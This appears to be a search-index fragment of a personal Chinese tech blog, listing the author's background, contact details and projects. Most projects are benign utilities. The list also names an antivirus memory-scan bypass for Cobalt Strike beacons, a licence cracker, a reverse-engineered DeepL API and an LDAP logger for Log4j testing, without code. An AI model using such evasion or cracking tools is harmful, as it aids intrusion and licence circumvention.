各种各样的库很多，可以快速验证自己的想法，无论是拿来搞安全还是水一下课程作业都是很爽的 C 性能非常牛逼，我就喜欢这种简洁和无与伦比的掌控感，搞二进制安全必备 Golang 是我目前最喜欢的语言，我已经用它写了不少项目了，无需付出太多精力就能轻松高并发，感觉写起来有种类似于Py脚本语言的快感 Rust 我觉得有点消耗脑细菌，每一次写完都感觉昏昏沉沉的 越来越喜欢了，甚至都不想写go了 JS 说实话我不太喜欢，但V8引擎的确厉害 现在我更喜欢用Golang写后端，用Vue来写前端 现在我新的个人项目都首选Rust了 ","date":"0001-01-01","objectID":"https://zu1k.com/about/:2:0","series":null,"tags":null,"title":"关于","uri":"https://zu1k.com/about/#编程经验"},{"categories":null,"content":"联系我 如果你有问题要和我交流，首选方式是在相应博文的评论区直接评论，我会收到邮件通知 除此之外，你还可以通过以下方式联系到我: Email: i@zu1k.com Twitter: @zu1k_ GitHub: @zu1k Keybase: @zu1k Matrix: @zu1k:mozilla.org 我的 PGP公钥 可以在 https://pgp.zu1k.com 或 hkps://keyserver.ubuntu.com 获取 (6A26 6AE0 18B6 DD21 C813 150E 4B9D 0993 3F48 F82D) 看看我最近读了什么文章？ https://read.zu1k.com ","date":"0001-01-01","objectID":"https://zu1k.com/about/:3:0","series":null,"tags":null,"title":"关于","uri":"https://zu1k.com/about/#联系我"},{"categories":null,"content":"此页面介绍我做的一些项目和工具","date":"0001-01-01","objectID":"https://zu1k.com/projects/","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/"},{"categories":null,"content":"此页面介绍我做的一些项目和工具 ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:0:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#"},{"categories":null,"content":"Nali 一个查询IP地理信息和CDN服务提供商的离线终端工具 多IP数据库支持 CDN 服务提供商查询 支持管道处理 支持交互式查询 同时支持IPv4和IPv6 支持多语言 查询完全离线 全平台支持 支持彩色输出 https://github.com/zu1k/nali ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:1:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#nali"},{"categories":null,"content":"Book Searcher 为上千万书籍创建索引并提供搜索，用以创建您的私人本地图书馆 https://github.com/book-searcher-org/book-searcher ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:2:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#book-searcher"},{"categories":null,"content":"ProxyPool 自动抓取tg频道、订阅地址、公开互联网上的ss、ssr、vmess、trojan节点信息，聚合去重后提供节点列表 https://github.com/zu1k/proxypool ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:3:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#proxypool"},{"categories":null,"content":"Copy Translator 使用Rust编写的，简单、轻量、好用的划词翻译软件，利用DeepL进行翻译 程序大小12MB，极其轻量 自动去除多余的换行和断句，优化PDF翻译体验 选中即翻译(划词翻译)，专注论文阅读 使用DeepL进行翻译，翻译效果极佳 https://github.com/zu1k/copy-translator ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:4:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#copy-translator"},{"categories":null,"content":"Good MITM 使用MITM技术提供rewrite、redirect、reject等功能 https://github.com/zu1k/good-mitm ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:5:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#good-mitm"},{"categories":null,"content":"Unified Clipboard 统一剪切板，局域网内多设备剪切板同步，这边复制，那边粘贴 局域网内通讯功能基于 libp2p 实现，利用 mDNS 协议进行设备发现，GossipSub 协议进行设备组区分和消息传递 Supported Type Text Image Supported OS Windows Linux MacOS Android https://github.com/zu1k/uniclip ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:6:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#unified-clipboard"},{"categories":null,"content":"Http Proxy IPv6 Pool Make every request from a separate IPv6 address. $ while true; do curl -x http://127.0.0.1:51080 ipv6.ip.sb; done 2001:19f0:6001:48e4:971e:f12c:e2e7:d92a 2001:19f0:6001:48e4:6d1c:90fe:ee79:1123 2001:19f0:6001:48e4:f7b9:b506:99d7:1be9 2001:19f0:6001:48e4:a06a:393b:e82f:bffc 2001:19f0:6001:48e4:245f:8272:2dfb:72ce https://github.com/zu1k/http-proxy-ipv6-pool https://zu1k.com/posts/tutorials/http-proxy-ipv6-pool/ ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:7:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#http-proxy-ipv6-pool"},{"categories":null,"content":"Telegram Keyword Bot Telegram关键词自动回复机器人: 根据群组管理员设定的关键词或者正则规则，自动回复文字、图片、文件或者进行永久禁言、临时禁言、踢出等群管操作 https://github.com/zu1k/tg-keyword-reply-bot ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:8:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#telegram-keyword-bot"},{"categories":null,"content":"Hosts-rs hosts文件解析，修改库，以及一些衍生 hosts: Hosts file parsing, modification library resolve-github: Use Cloudflare DoH to resolve GitHub domains and generate hosts files github-hosts: Modify hosts to speed up GitHub access https://github.com/zu1k/hosts-rs ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:9:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#hosts-rs"},{"categories":null,"content":"SDUSRun 校园网深澜认证登录，SRun 3000 https://github.com/zu1k/sdusrun ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:10:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#sdusrun"},{"categories":null,"content":"MITM Netflix VIP Unlocker Share your Netflix VIP with your friends without evealing password and cookies. https://nf.mitm.plus/ ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:11:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#mitm-netflix-vip-unlocker"},{"categories":null,"content":"DeepL Free API 通过逆向DeepL客户端使用的协议，实现的免费DeepL API docker run -itd -p 8080:80 zu1k/deepl https://hub.docker.com/r/zu1k/deepl ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:12:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#deepl-free-api"},{"categories":null,"content":"Beacon Hook Bypass Memscan cs bypass卡巴斯基内存查杀 的Rust实现 https://github.com/zu1k/beacon_hook_bypass_memscan ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:13:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#beacon-hook-bypass-memscan"},{"categories":null,"content":"go-service-ipfs go-storage的IPFS存储后端支持 https://github.com/beyondstorage/go-service-ipfs ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:14:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#go-service-ipfs"},{"categories":null,"content":"PL0 Compiler 编译原理课程实验，勿用 简化版PL0语言的词法分析、语法分析、编译成中间代码，解释执行 https://github.com/zu1k/pl0compiler ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:15:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#pl0-compiler"},{"categories":null,"content":"GitHub Hosts 修改hosts加速GitHub访问 https://github.com/zu1k/github-hosts ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:16:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#github-hosts"},{"categories":null,"content":"Xray Cracker 生成Xray永久证书 https://github.com/zu1k/xray-crack-rm ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:17:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#xray-cracker"},{"categories":null,"content":"DogeCloud COS Action 使用 Github Actions 上传文件到DogeCloud COS https://github.com/zu1k/dogecloud-cos-action ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:18:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#dogecloud-cos-action"},{"categories":null,"content":"印象笔记去广告 通过替换广告链接去除印象笔记烦人广告 https://github.com/zu1k/evernote_noad ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:19:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#印象笔记去广告"},{"categories":null,"content":"GlobalSSH for GitHub 利用UCloud的免费GlobalSSH服务加速github的ssh协议 https://github.com/zu1k/globalssh4github ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:20:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#globalssh-for-github"},{"categories":null,"content":"CoolQ RSS Push Bot RSS订阅的QQ机器人 https://github.com/zu1k/coolq-rsspushbot ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:21:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#coolq-rss-push-bot"},{"categories":null,"content":"My Followers 这是我的Followers数目破1k的纪念项目，查看 My GitHub Followers 通过GitHub的GraphQL Api，获取自己的follower列表，然后生成头像墙。通过GitHub Action定时每日更新 Fork并开启GitHub Action功能，可自动生成自己的 https://github.com/zu1k/my_followers ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:22:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#my-followers"},{"categories":null,"content":"LDAP-log 一个LDAP请求监听器，摆脱dnslog平台 由于Apache Log4j RCE漏洞的火热，各大dnslog平台成为过年狂欢中最累的那一部分，不如写一个专门针对ldap协议的logger https://github.com/zu1k/ldap-log ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:23:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#ldap-log"},{"categories":null,"content":"LibAFL-Book-zh LibAFL 文档书 简体中文版翻译 在线访问：https://libafl-book-zh.zu1k.com/ https://github.com/zu1k/LibAFL-Book-zh ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:24:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#libafl-book-zh"},{"categories":null,"content":"install cert 在操作系统的信任区安装根证书 https://github.com/zu1k/install-cert ","date":"0001-01-01","objectID":"https://zu1k.com/projects/:25:0","series":null,"tags":null,"title":"我的项目","uri":"https://zu1k.com/projects/#install-cert"},{"categories":null,"content":"友情链接，欢迎与我交换友链","date":"0001-01-01","objectID":"https://zu1k.com/links/","series":null,"tags":null,"title":"友情链接","uri":"https://zu1k.com/links/"},{"categories":null,"content":"如何交换友链？ 成为我的朋友，我们互相应该有一个初步的了解 站点内容不要太水，最好能够保证一年至少更新一次 告诉我你的站点信息，包括 名称、url、logo 和 一个简短的描述 在你的站点上增加指向本站的友链，然后想办法联系到我 ","date":"0001-01-01","objectID":"https://zu1k.com/links/:1:0","series":null,"tags":null,"title":"友情链接","uri":"https://zu1k.com/links/#如何交换友链"},{"categories":null,"content":"本站信息 Name: zu1k BIO: A boy dreaming of traveling around the world. URL: https://zu1k.com Logo: https://zu1k.com/images/logo.jpg ","date":"0001-01-01","objectID":"https://zu1k.com/links/:2:0","series":null,"tags":null,"title":"友情链接","uri":"https://zu1k.com/links/#本站信息"}]